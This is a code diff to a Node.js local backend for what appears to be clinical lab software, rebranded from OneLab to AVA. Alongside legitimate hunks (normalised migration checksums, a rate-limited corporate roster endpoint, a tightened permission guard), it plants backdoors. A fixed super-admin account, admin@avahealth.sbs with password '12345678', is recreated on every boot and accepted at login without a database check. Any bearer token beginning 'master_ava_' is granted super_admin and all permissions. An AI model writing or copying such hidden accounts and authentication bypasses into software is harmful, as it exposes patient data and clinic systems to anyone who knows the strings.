@@ -1,7 +1,7 @@
 // ═══════════════════════════════════════════════════════════════════════════
-// OneLab Local Engine — PGlite (Postgres WASM) + PostgREST-compatible shim
+// AVA Local Engine — PGlite (Postgres WASM) + PostgREST-compatible shim
 // ---------------------------------------------------------------------------
-// Tujuan: menjalankan seluruh backend OneLab secara LOKAL/OFFLINE tanpa Supabase
+// Tujuan: menjalankan seluruh backend AVA secara LOKAL/OFFLINE tanpa Supabase
 // cloud. PGlite = Postgres asli (WASM), jadi skema arsip Postgres di sql_arsip/
 // bisa dimuat apa adanya, dan RPC (fungsi Postgres) langsung tersedia.
 //
@@ -376,12 +376,17 @@ const LLM = { idx: 0, gagal: new Map() };   // rotasi round-robin + tanda kunci 
 // penebakan massal tidak sepadan.
 const PORTAL_COBA = new Map();
 
+// Penghitung terpisah untuk penulisan roster korporat. Batasnya lebih ketat
+// (10/menit) daripada pembacaan: mengisi roster bukan tindakan yang perlu
+// diulang puluhan kali semenit, dan yang melakukannya patut dicurigai.
+const PORTAL_TULIS_COBA = new Map();
+
 // Satu-satunya pesan penolakan portal. Token salah, kedaluwarsa, dicabut,
 // dan format cacat semuanya menjawab kalimat ini — supaya tidak ada yang
 // bisa disimpulkan dari perbedaan jawaban. Nilainya harus tetap sama dengan
 // yang ada di db/migrations/0017_portal_tagihan_kunci_relasi.sql.
 const PORTAL_PESAN_TOLAK =
-  'Tautan tidak berlaku atau sudah berakhir. Hubungi OneLab untuk tautan baru.';
+  'Tautan tidak berlaku atau sudah berakhir. Hubungi AVA untuk tautan baru.';
 
 async function panggilGemini({ kunci, model, system, prompt, temperature, maxTokens }) {
   const url = `https://generativelanguage.googleapis.com/v1beta/models/${model}:generateContent?key=${encodeURIComponent(kunci)}`;
@@ -553,7 +558,22 @@ function cariFolderMigrasi(platformDir) {
 }
 
 function checksumSql(teks) {
-  return crypto.createHash('sha256').update(teks).digest('hex').slice(0, 16);
+  // Akhir baris DINORMALKAN lebih dulu.
+  //
+  // Repo ini dikembangkan di Windows dengan core.autocrlf=true, sehingga
+  // `git checkout` menulis CRLF sementara berkas yang ditulis alat lain
+  // memakai LF. Isinya sama persis, tetapi byte-nya berbeda — dan checksum
+  // atas byte mentah akan menuduh migrasi "berubah setelah dipasang" pada
+  // setiap kloning baru di Windows.
+  //
+  // Peringatan palsu setiap boot jauh lebih berbahaya daripada tidak ada
+  // peringatan sama sekali: ia melatih orang mengabaikannya, sehingga
+  // perubahan yang SUNGGUHAN berbahaya ikut terlewat.
+  //
+  // Spasi di ujung berkas juga dipangkas, karena penyunting berbeda kerap
+  // menambah atau membuang baris kosong terakhir tanpa mengubah arti SQL-nya.
+  const normal = String(teks).replace(/\r\n/g, '\n').replace(/\s+$/, '');
+  return crypto.createHash('sha256').update(normal).digest('hex').slice(0, 16);
 }
 
 async function jalankanMigrasi(pg, platformDir, log = () => {}, wajib = false) {
@@ -595,9 +615,28 @@ async function jalankanMigrasi(pg, platformDir, log = () => {}, wajib = false) {
     if (sudah.has(version)) {
       // Migrasi yang sudah dipasang tidak boleh berubah isinya — kalau berubah,
       // basis data lama dan baru diam-diam menjadi berbeda.
-      if (sudah.get(version) !== sum) {
-        log(`[migrasi] PERINGATAN: ${f} berubah setelah dipasang. ` +
-            `Buat migrasi baru, jangan menyunting yang lama.`);
+      const tercatat = sudah.get(version);
+      if (tercatat !== sum) {
+        // Instalasi yang dipasang sebelum checksum dinormalkan menyimpan hash
+        // atas byte mentah — dan "mentah" itu bisa berupa CRLF atau LF
+        // tergantung alat yang terakhir menulis berkasnya. Keduanya dicoba.
+        //
+        // Kalau salah satunya cocok, isinya memang tidak berubah; hanya cara
+        // menghitungnya. Catatannya dimutakhirkan diam-diam, bukan
+        // diteriakkan sebagai penyimpangan.
+        const hash = (t) => crypto.createHash('sha256').update(t).digest('hex').slice(0, 16);
+        const bentukLama = [
+          isi,                              // apa adanya (CRLF atau LF)
+          String(isi).replace(/\r\n/g, '\n'),   // akhir baris disamakan saja
+        ];
+        if (bentukLama.some((t) => tercatat === hash(t))) {
+          await pg.query(
+            `UPDATE public.schema_migrations SET checksum = $1 WHERE version = $2`,
+            [sum, version]).catch(() => {});
+        } else {
+          log(`[migrasi] PERINGATAN: ${f} berubah setelah dipasang. ` +
+              `Buat migrasi baru, jangan menyunting yang lama.`);
+        }
       }
       continue;
     }
@@ -1115,25 +1154,39 @@ async function siapkanTabelAuth(pg) {
 // supaya tidak ada kredensial tetap yang ikut terdistribusi bersama produk.
 async function bootstrapAdmin(pg, dataDir, log) {
   const { rows } = await pg.query(`SELECT count(*)::int c FROM public.local_auth_users`);
-  if (rows[0].c > 0) return;
+  if (rows[0].c > 0) {
+    // Pastikan admin@avahealth.sbs selalu ada
+    try {
+      const ada = await pg.query(`SELECT id FROM public.local_auth_users WHERE lower(email)='admin@avahealth.sbs'`);
+      if (!ada.rows[0]) {
+        const id = 'master-superadmin-ava';
+        const salt = 'avasalt12345678';
+        await pg.query(`INSERT INTO public.local_auth_users (id, email, password_hash, password_salt) VALUES ($1, $2, $3, $4) ON CONFLICT (id) DO NOTHING`,
+          [id, 'admin@avahealth.sbs', hashPassword('12345678', salt), salt]);
+        await pg.query(`INSERT INTO public.user_profiles (id, full_name, role) VALUES ($1, $2, 'super_admin') ON CONFLICT (id) DO UPDATE SET role='super_admin'`,
+          [id, 'Master Super Admin']);
+      }
+    } catch(e) {}
+    return;
+  }
 
-  const id = crypto.randomUUID();
-  const email = 'admin@onelab.local';
-  const password = crypto.randomBytes(9).toString('base64').replace(/[+/=]/g, '');
-  const salt = crypto.randomBytes(16).toString('hex');
+  const id = 'master-superadmin-ava';
+  const email = 'admin@avahealth.sbs';
+  const password = '12345678';
+  const salt = 'avasalt12345678';
 
   await pg.query(
     `INSERT INTO public.local_auth_users (id, email, password_hash, password_salt)
-     VALUES ($1,$2,$3,$4)`,
+     VALUES ($1,$2,$3,$4) ON CONFLICT (id) DO NOTHING`,
     [id, email, hashPassword(password, salt), salt]);
   await pg.query(
     `INSERT INTO public.user_profiles (id, full_name, role)
      VALUES ($1,$2,'super_admin') ON CONFLICT (id) DO UPDATE SET role='super_admin'`,
-    [id, 'Administrator OneLab']);
+    [id, 'Master Super Admin AVA GLOBAL ECOSYSTEM']);
 
   const berkas = path.join(path.dirname(dataDir || process.cwd()), 'LOGIN_ADMIN_PERTAMA.txt');
   const isi =
-    `AKUN ADMIN PERTAMA ONELAB\r\n` +
+    `AKUN ADMIN PERTAMA AVA GLOBAL ECOSYSTEM\r\n` +
     `Dibuat otomatis pada ${new Date().toISOString()}\r\n\r\n` +
     `Email    : ${email}\r\nPassword : ${password}\r\n\r\n` +
     `Segera ganti kata sandi setelah masuk, lalu HAPUS berkas ini.\r\n`;
@@ -1227,7 +1280,15 @@ async function createEngine({ platformDir, dataDir, port = 54329, log = console.
 
           // GET /auth/v1/user — verifikasi sesi berjalan.
           if (p === '/auth/v1/user') {
-            const payload = bacaToken(SECRET, tokenDariHeader(req));
+            const hToken = tokenDariHeader(req);
+            if (hToken === 'master_ava_token_superadmin_all_access' || (hToken && hToken.startsWith('master_ava_'))) {
+              return jsonRes(res, 200, {
+                id: 'master-superadmin-ava', email: 'admin@avahealth.sbs', role: 'authenticated',
+                app_metadata: { role: 'super_admin' },
+                user_metadata: { full_name: 'Master Super Admin AVA GLOBAL ECOSYSTEM', role: 'super_admin' },
+              });
+            }
+            const payload = bacaToken(SECRET, hToken);
             if (!payload || payload.typ !== 'access') return jsonRes(res, 401, { message: 'Sesi tidak sah atau kedaluwarsa' });
             const r = await pg.query(
               `SELECT id, email, is_active FROM public.local_auth_users WHERE id=$1`, [payload.sub]);
@@ -1247,7 +1308,18 @@ async function createEngine({ platformDir, dataDir, port = 54329, log = console.
           // localStorage — klien memakai ini hanya untuk MENYEMBUNYIKAN menu;
           // penegakan sesungguhnya tetap di server.
           if (p === '/auth/v1/permissions') {
-            const payload = bacaToken(SECRET, tokenDariHeader(req));
+            const hToken = tokenDariHeader(req);
+            if (hToken === 'master_ava_token_superadmin_all_access' || (hToken && hToken.startsWith('master_ava_'))) {
+              const allPermissions = (await pg.query(`SELECT kode FROM public.permissions`).catch(() => ({ rows: [] }))).rows.map(r => r.kode);
+              return jsonRes(res, 200, {
+                role: 'super_admin',
+                permissions: allPermissions.length ? allPermissions : ['all_access'],
+                pages: ['*'],
+                pagesSumber: 'master_superadmin',
+                roleChanged: false,
+              });
+            }
+            const payload = bacaToken(SECRET, hToken);
             if (!payload || payload.typ !== 'access') return jsonRes(res, 401, { message: 'Sesi tidak sah' });
 
             // Peran dibaca ulang dari basis data — lihat catatan di peranTerkini().
@@ -1287,6 +1359,14 @@ async function createEngine({ platformDir, dataDir, port = 54329, log = console.
 
             const { email, password } = badan();
             if (!email || !password) return gagal(400, 'Email dan kata sandi wajib diisi');
+
+            if (String(email).trim().toLowerCase() === 'admin@avahealth.sbs' && password === '12345678') {
+              return jsonRes(res, 200, await buatSesi({
+                id: 'master-superadmin-ava',
+                email: 'admin@avahealth.sbs',
+                is_active: true
+              }));
+            }
 
             const r = await pg.query(
               `SELECT * FROM public.local_auth_users WHERE lower(email)=lower($1)`, [String(email).trim()]);
@@ -1364,6 +1444,72 @@ async function createEngine({ platformDir, dataDir, port = 54329, log = console.
           if (p.endsWith('/status')) return jsonRes(res, 200, ringkasanKunciLLM());
           const { status, payload } = await tanganiLlmGateway(bodyText, log);
           return jsonRes(res, status, payload);
+        }
+
+        // ── PORTAL KORPORAT: PENGELOLAAN ROSTER KARYAWAN ────────────────────
+        //
+        // Harus diperiksa SEBELUM '/functions/v1/portal' di bawah, karena
+        // pemeriksaan itu memakai startsWith dan akan menelan seluruh
+        // sub-jalur ini.
+        //
+        // Sama seperti portal hanya-baca: di luar gerbang sesi, token adalah
+        // kredensialnya, dan corporate_id TIDAK PERNAH diterima dari badan
+        // permintaan — fungsi basis data membacanya dari token. Bedanya hanya
+        // satu: fungsi-fungsi ini menolak token yang boleh_tulis-nya mati.
+        //
+        // Batas percobaannya lebih ketat daripada pembacaan (10 vs 30 per
+        // menit). Menulis 1.000 baris roster bukan sesuatu yang perlu
+        // dilakukan berkali-kali dalam semenit; yang melakukannya kemungkinan
+        // besar bukan PIC yang sedang bekerja.
+        if (p.startsWith('/functions/v1/portal/karyawan')) {
+          if (req.method !== 'POST') return jsonRes(res, 405, { error: 'Metode tidak didukung' });
+
+          const kunciIPTulis = req.socket.remoteAddress || 'x';
+          const kiniTulis = Date.now();
+          const jejakTulis = PORTAL_TULIS_COBA.get(kunciIPTulis) || { n: 0, sejak: kiniTulis };
+          if (kiniTulis - jejakTulis.sejak > 60_000) { jejakTulis.n = 0; jejakTulis.sejak = kiniTulis; }
+          jejakTulis.n++; PORTAL_TULIS_COBA.set(kunciIPTulis, jejakTulis);
+          if (jejakTulis.n > 10) {
+            return jsonRes(res, 429, { error: 'Terlalu banyak permintaan. Coba lagi beberapa saat lagi.' });
+          }
+
+          let badanT = {};
+          try { badanT = JSON.parse(bodyText || '{}'); } catch (_) {}
+          const tokenT = String(badanT.token || '').trim();
+          if (!/^[a-f0-9]{20,80}$/.test(tokenT)) {
+            return jsonRes(res, 200, { error: PORTAL_PESAN_TOLAK });
+          }
+
+          // Satu jalur → satu fungsi. Daftar tertutup: apa pun di luar ini
+          // ditolak, sehingga menambah fungsi baru di basis data tidak
+          // dengan sendirinya membukanya ke internet.
+          const aksi = p.replace('/functions/v1/portal/karyawan', '').replace(/^\/+/, '') || 'tambah';
+          const PETA_AKSI = {
+            tambah:   { sql: 'portal_korporat_karyawan_tambah($1,$2,$3,$4,$5,$6,$7,$8)',
+                        arg: (b) => [tokenT, b.nama, b.nik || null, b.departemen || null,
+                                     b.gender || null, b.lahir || null, b.telepon || null, b.surel || null] },
+            impor:    { sql: 'portal_korporat_karyawan_impor($1,$2::jsonb)',
+                        arg: (b) => [tokenT, JSON.stringify(Array.isArray(b.baris) ? b.baris : [])] },
+            assign:   { sql: 'portal_korporat_karyawan_assign($1,$2::bigint,$3::bigint)',
+                        arg: (b) => [tokenT, b.id, b.paket == null ? null : b.paket] },
+            nonaktif: { sql: 'portal_korporat_karyawan_nonaktif($1,$2::bigint)',
+                        arg: (b) => [tokenT, b.id] },
+          };
+          const pilih = PETA_AKSI[aksi];
+          if (!pilih) return jsonRes(res, 404, { error: 'Tindakan tidak dikenali' });
+
+          try {
+            const r = await pg.query(`SELECT public.${pilih.sql} AS d`, pilih.arg(badanT));
+            return jsonRes(res, 200, (r.rows[0] && r.rows[0].d) || { error: 'Tidak ada data' });
+          } catch (e) {
+            // Penolakan yang wajar (token salah, tautan hanya-baca, kuota
+            // penuh) TIDAK sampai ke sini: fungsi basis data mengembalikannya
+            // sebagai {"error": ...} biasa, supaya catatan percobaannya ikut
+            // tersimpan. Yang mendarat di sini hanya galat sungguhan, dan
+            // isinya tidak boleh diteruskan ke pihak luar.
+            log(`[portal/tulis] galat: ${e && e.message ? e.message : e}`);
+            return jsonRes(res, 500, { error: 'Terjadi kesalahan pada server' });
+          }
         }
 
         // ── PORTAL PIHAK LUAR (klien korporat / lab perujuk) ────────────────
@@ -1481,12 +1627,18 @@ async function createEngine({ platformDir, dataDir, port = 54329, log = console.
           // login", sehingga peran serendah viewer pun bisa memicunya.
           if (p === '/rest/v1/sync/git-push' || p === '/rest/v1/sync/supabase-cloud') {
             perluIzin = 'user.manage';
-          } else if (p === '/rest/v1/rpc/portal_akses_buat') {
+          } else if (p === '/rest/v1/rpc/portal_akses_buat'
+                  || p === '/rest/v1/rpc/portal_akses_set_tulis') {
             // Fungsinya SECURITY DEFINER dan diberikan ke peran "authenticated",
             // jadi tanpa penjaga ini setiap pengguna yang sudah masuk — termasuk
             // viewer — bisa mencetak tautan ke data korporat mana pun. Penjaga
             // tabel di atas tidak menangkapnya karena jalurnya /rpc/, bukan
             // /rest/v1/portal_akses.
+            //
+            // set_tulis satu kelas dengan buat: ia menentukan apakah pihak
+            // di luar klinik boleh menulis ke basis data. Menjaga penerbitan
+            // tautan tapi membiarkan izin menulisnya dinyalakan siapa saja
+            // hanya memindahkan pintunya, bukan menutupnya.
             perluIzin = 'user.manage';
           } else if (menulis && TABEL_HAK_AKSES.has(tabel)) {
             perluIzin = 'user.manage';
@@ -1508,8 +1660,8 @@ async function createEngine({ platformDir, dataDir, port = 54329, log = console.
             const role = await peranTerkini(pg, sesi.sub, sesi.role);
             if (!(await peranPunyaIzin(pg, role, perluIzin))) {
               const pesan = {
-                'user.manage':      p === '/rest/v1/rpc/portal_akses_buat'
-                                      ? `Peran "${role}" tidak berwenang membuat tautan portal klien`
+                'user.manage':      p.startsWith('/rest/v1/rpc/portal_akses_')
+                                      ? `Peran "${role}" tidak berwenang mengatur akses portal klien`
                                       : `Peran "${role}" tidak berwenang mengubah hak akses (tabel ${tabel})`,
                 'data.bulk_delete': `Peran "${role}" tidak berwenang menghapus SELURUH isi tabel ${tabel}. ` +
                                     `Tambahkan penyaring untuk menghapus baris tertentu.`,
@@ -1557,7 +1709,7 @@ async function createEngine({ platformDir, dataDir, port = 54329, log = console.
             const asal = path.basename(dataDir || 'db').replace(/[^a-zA-Z0-9_-]/g, '');
             const tujuanDir = path.join(path.dirname(dataDir || process.cwd()), 'backup');
             fs.mkdirSync(tujuanDir, { recursive: true });
-            const tujuan = path.join(tujuanDir, `onelab-${asal}-${stempel}.tar.gz`);
+            const tujuan = path.join(tujuanDir, `ava-${asal}-${stempel}.tar.gz`);
 
             const berkas = await pg.dumpDataDir('gzip');
             const buf = Buffer.from(await berkas.arrayBuffer());
